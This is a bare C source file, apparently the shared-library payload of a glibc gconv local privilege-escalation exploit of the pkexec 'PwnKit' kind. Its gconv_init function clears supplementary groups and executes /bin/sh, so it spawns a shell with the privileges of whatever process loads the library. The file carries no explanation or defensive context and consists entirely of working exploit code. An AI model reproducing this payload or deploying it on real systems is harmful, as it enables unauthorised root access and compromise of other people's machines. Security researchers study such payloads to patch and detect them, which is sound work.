#define _GNU_SOURCE
#include <unistd.h>
#include <sys/types.h>
#include <grp.h>

void gconv_init(void) {
    setgroups(0, NULL);
    execve("/bin/sh", NULL, NULL);
}
